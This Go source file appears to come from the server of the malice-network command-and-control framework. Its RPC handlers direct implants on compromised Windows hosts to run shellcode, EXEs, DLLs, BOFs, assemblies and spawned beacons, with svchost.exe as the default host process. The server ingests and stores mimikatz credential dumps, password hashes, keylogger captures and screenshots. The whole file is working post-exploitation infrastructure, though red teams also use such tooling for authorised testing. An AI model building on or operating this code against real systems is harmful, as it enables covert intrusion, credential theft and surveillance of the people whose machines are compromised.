package rpc

import (
	"context"
	"encoding/json"
	"fmt"
	"math"
	"strings"

	"github.com/chainreactors/IoM-go/consts"
	"github.com/chainreactors/IoM-go/proto/client/clientpb"
	implantpb "github.com/chainreactors/IoM-go/proto/implant/implantpb"
	"github.com/chainreactors/IoM-go/types"

	"github.com/chainreactors/logs"
	"github.com/chainreactors/malice-network/helper/utils/output"
	"github.com/chainreactors/malice-network/helper/utils/pe"
	"github.com/chainreactors/malice-network/server/internal/core"
	"github.com/chainreactors/malice-network/server/internal/db"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

//var (
//	argueMap = map[string]string{}
//)

func handleBinary(binary *implantpb.ExecuteBinary) *implantpb.ExecuteBinary {
	if binary.ProcessName == "" {
		binary.ProcessName = `C:\\Windows\\System32\\svchost.exe`
	}
	if binary.Timeout == 0 {
		binary.Timeout = math.MaxUint32
	}
	if len(binary.Args) == 0 {
		binary.Args = []string{""}
	}
	binary.Timeout = binary.Timeout * 1000
	return binary
}

func ContextCallback(task *core.Task, ctx context.Context) func(*implantpb.Spite) {
	meta := getContextMeta(ctx)
	if meta.ContextType == "" || meta.Nonce == "" {
		return func(spite *implantpb.Spite) {
			return
		}
	}
	return func(spite *implantpb.Spite) {
		content := spite.GetBinaryResponse().GetData()
		if content == nil {
			content = []byte(spite.GetResponse().GetOutput())
			if content == nil {
				logs.Log.Error("Empty content")
				return
			}
		}
		saveTaskContextsFromContent(task, meta, content)
	}
}

func saveTaskContextsFromContent(task *core.Task, meta contextRequestMeta, content []byte) {
	var ctxs output.Contexts
	switch meta.ContextType {
	case consts.ContextMedia:
		if err := core.HandleMediaChunk(task, meta.Nonce, meta.Identifier, meta.FileName, meta.MediaKind, content); err != nil {
			logs.Log.Error(err)
		}
		return
	case output.GOGOPortType:
		c, err := output.ParseGOGO(content)
		if err != nil {
			logs.Log.Error(err)
			return
		}
		ctxs = append(ctxs, c)
	case "zombie":
		cs, err := output.ParseZombie(content)
		if err != nil {
			logs.Log.Error(err)
			return
		}
		for _, c := range cs {
			ctxs = append(ctxs, c)
		}
	case "mimikatz":
		cs, err := output.ParseMimikatz(content)
		if err != nil {
			logs.Log.Error(err)
			return
		}
		for _, c := range cs {
			ctxs = append(ctxs, c)
		}
	case "hashdump":
		cs, err := output.ParseHashdump(content)
		if err != nil {
			logs.Log.Error(err)
			return
		}
		for _, c := range cs {
			ctxs = append(ctxs, c)
		}
	case consts.ContextKeyLogger:
		err := core.HandleKeylogger(content, task, meta.Identifier, meta.FileName, meta.Nonce)
		if err != nil {
			logs.Log.Error(err)
			return
		}
		return
	}

	for _, c := range ctxs {
		value, err := json.Marshal(c)
		if err != nil {
			logs.Log.Error(err)
			return
		}

		model, err := db.SaveContext(&clientpb.Context{
			Task:    task.ToProtobuf(),
			Session: task.Session.ToProtobufLite(),
			Type:    c.Type(),
			Value:   value,
			Nonce:   meta.Nonce,
		})
		if err != nil {
			logs.Log.Error(err)
			return
		}

		core.EventBroker.Publish(core.Event{
			EventType: consts.EventContext,
			Op:        c.Type(),
			Task:      task.ToProtobuf(),
			Message:   fmt.Sprintf("new %s context: %s", c.Type(), model.ID),
			Important: true,
		})
	}
}

func (rpc *Server) Execute(ctx context.Context, req *implantpb.ExecRequest) (*clientpb.Task, error) {
	greq, err := newGenericRequest(ctx, req)
	if err != nil {
		return nil, err
	}
	if !req.Realtime {
		ch, err := rpc.GenericHandler(ctx, greq)
		if err != nil {
			return nil, err
		}

		greq.HandlerResponse(ch, types.MsgExec)
	} else {
		greq.Count = -1
		_, out, err := rpc.StreamGenericHandler(ctx, greq)
		if err != nil {
			return nil, err
		}

		runTaskHandler(greq.Task, func() error {
			for {
				resp, ok := recvSpite(greq.Task.Ctx, out)
				if !ok {
					return ErrTaskContextCancelled
				}
				exec := resp.GetExecResponse()
				err := types.AssertSpite(resp, types.MsgExec)
				if err != nil {
					return buildTaskError(err)
				}
				err = greq.HandlerSpite(resp)
				if err != nil {
					return err
				}
				if exec.End {
					greq.Task.Finish(resp, "")
					break
				}
			}
			return nil
		}, greq.Task.Close)
	}

	return greq.Task.ToProtobuf(), nil

}

func (rpc *Server) ExecuteAssembly(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
	return rpc.GenericInternal(ctx, req, types.MsgBinaryResponse)
}

func (rpc *Server) ExecuteShellcode(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
	req = handleBinary(req)
	return rpc.GenericInternalWithSession(ctx, req, types.MsgBinaryResponse, func(greq *GenericRequest, spite *implantpb.Spite) {
		ContextCallback(greq.Task, ctx)(spite)
	})
}

func (rpc *Server) ExecuteBof(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
	return rpc.GenericInternalWithSession(ctx, req, types.MsgBinaryResponse, func(greq *GenericRequest, spite *implantpb.Spite) {
		tctx := greq.TaskContext(spite)
		bofResps, err := output.ParseBOFResponse(tctx)
		if err != nil {
			logs.Log.Error(err)
			return
		}

		// handler context bof callback
		meta := getContextMeta(ctx)
		var results strings.Builder
		for _, bofResp := range bofResps.(output.BOFResponses) {
			switch bofResp.CallbackType {
			case output.CallbackOutput, output.CallbackOutputOem, output.CallbackOutputUtf8:
				results.Write(bofResp.Data)
			case output.CallbackScreenshot:
				if bofResp.Length <= 4 {
					results.WriteString("Null screenshot data\n")
					continue
				}
				err = core.HandleScreenshot(bofResp.Data, greq.Task)
			case output.CallbackFile:
				err = core.HandleFileOperations("open", bofResp.Data, greq.Task)
			case output.CallbackFileWrite:
				err = core.HandleFileOperations("write", bofResp.Data, greq.Task)
			case output.CallbackFileClose:
				err = core.HandleFileOperations("close", bofResp.Data, greq.Task)
			default:
				continue
			}
		}
		if meta.ContextType != "" && meta.Nonce != "" && results.Len() > 0 {
			saveTaskContextsFromContent(greq.Task, meta, []byte(results.String()))
		}
	})
}

func (rpc *Server) ExecuteEXE(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
	req = handleBinary(req)
	return rpc.GenericInternalWithSession(ctx, req, types.MsgBinaryResponse, func(greq *GenericRequest, spite *implantpb.Spite) {
		ContextCallback(greq.Task, ctx)(spite)
	})
}

func (rpc *Server) ExecuteDll(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
	req = handleBinary(req)
	return rpc.GenericInternal(ctx, req, types.MsgBinaryResponse)
}

func (rpc *Server) ExecuteDLL(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
	return rpc.ExecuteDll(ctx, req)
}

func (rpc *Server) ExecuteSpawn(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
	if req == nil || strings.TrimSpace(req.GetName()) == "" {
		return nil, status.Error(codes.InvalidArgument, "artifact name is required")
	}

	session, err := getSession(ctx)
	if err != nil {
		return nil, err
	}
	sessionPB := session.ToProtobufLite()
	if sessionPB.GetOs() == nil || !strings.EqualFold(sessionPB.GetOs().GetName(), consts.Windows) {
		return nil, status.Error(codes.FailedPrecondition, "spawn is only supported on Windows sessions")
	}

	artifactModel, err := db.GetArtifactByName(strings.TrimSpace(req.GetName()))
	if err != nil {
		return nil, status.Errorf(codes.NotFound, "artifact %q was not found", strings.TrimSpace(req.GetName()))
	}
	if !strings.EqualFold(artifactModel.Status, consts.BuildStatusCompleted) {
		return nil, status.Errorf(codes.FailedPrecondition, "artifact %q is not completed", artifactModel.Name)
	}

	artifact, err := artifactModel.ToArtifact()
	if err != nil {
		return nil, status.Errorf(codes.Internal, "read artifact %q: %v", artifactModel.Name, err)
	}
	if !strings.EqualFold(artifact.GetType(), consts.CommandBuildBeacon) {
		return nil, status.Errorf(codes.FailedPrecondition, "artifact %q is not a Beacon", artifact.GetName())
	}
	if !strings.EqualFold(artifact.GetPlatform(), consts.Windows) {
		return nil, status.Errorf(codes.FailedPrecondition, "artifact %q is not a Windows Artifact", artifact.GetName())
	}

	module, err := spawnArtifactModule(artifact)
	if err != nil {
		return nil, status.Errorf(codes.FailedPrecondition, "artifact %q: %v", artifact.GetName(), err)
	}
	if !spawnSessionHasModule(sessionPB, module) {
		return nil, status.Errorf(codes.FailedPrecondition, "session does not have required module %q", module)
	}
	arch, err := resolveSpawnArch(artifact, sessionPB)
	if err != nil {
		return nil, status.Errorf(codes.FailedPrecondition, "artifact %q: %v", artifact.GetName(), err)
	}

	binary := &implantpb.ExecuteBinary{
		Name:        artifact.GetName(),
		Bin:         artifact.GetBin(),
		Type:        module,
		ProcessName: req.GetProcessName(),
		Output:      req.GetOutput(),
		Arch:        arch,
		Timeout:     req.GetTimeout(),
		Sacrifice:   req.GetSacrifice(),
		Delay:       req.GetDelay(),
	}

	switch module {
	case consts.ModuleExecuteExe:
		return rpc.ExecuteEXE(ctx, binary)
	case consts.ModuleExecuteDll:
		return rpc.ExecuteDLL(ctx, binary)
	case consts.ModuleExecuteShellcode:
		return rpc.ExecuteShellcode(ctx, binary)
	default:
		return nil, status.Errorf(codes.Internal, "unsupported spawn module %q", module)
	}
}

func spawnArtifactModule(artifact *clientpb.Artifact) (string, error) {
	if artifact == nil || len(artifact.GetBin()) == 0 {
		return "", fmt.Errorf("binary content is empty")
	}

	switch pe.CheckPEType(artifact.GetBin()) {
	case consts.EXEFile:
		return consts.ModuleExecuteExe, nil
	case consts.DLLFile:
		return consts.ModuleExecuteDll, nil
	}

	switch strings.ToLower(strings.TrimSpace(artifact.GetFormat())) {
	case consts.ShellcodeFile, "bin", consts.FormatRaw, "shellcode", ".shellcode":
		return consts.ModuleExecuteShellcode, nil
	default:
		return "", fmt.Errorf("unsupported binary format %q", artifact.GetFormat())
	}
}

func spawnSessionHasModule(session *clientpb.Session, module string) bool {
	if session == nil {
		return false
	}
	for _, loaded := range session.GetModules() {
		if strings.EqualFold(strings.TrimSpace(loaded), module) {
			return true
		}
	}
	return false
}

func resolveSpawnArch(artifact *clientpb.Artifact, session *clientpb.Session) (uint32, error) {
	candidates := []string{artifact.GetArch()}
	if target, ok := consts.GetBuildTarget(artifact.GetTarget()); ok {
		candidates = append(candidates, target.Arch)
	}
	if session != nil && session.GetOs() != nil {
		candidates = append(candidates, session.GetOs().GetArch())
	}

	for _, candidate := range candidates {
		normalized := consts.FormatArch(strings.ToLower(strings.TrimSpace(candidate)))
		if arch, ok := consts.ArchMap[normalized]; ok {
			return uint32(arch), nil
		}
	}
	return 0, fmt.Errorf("architecture is missing or unsupported")
}

func (rpc *Server) ExecutePowerpick(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
	return rpc.GenericInternal(ctx, req, types.MsgBinaryResponse)
}

func (rpc *Server) ExecuteArmory(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
	req = handleBinary(req)
	return rpc.GenericInternal(ctx, req, types.MsgBinaryResponse)
}

func (rpc *Server) ExecuteLocal(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
	req = handleBinary(req)
	return rpc.GenericInternal(ctx, req, types.MsgBinaryResponse)
}

func (rpc *Server) InlineLocal(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
	req = handleBinary(req)
	return rpc.GenericInternal(ctx, req, types.MsgBinaryResponse)
}
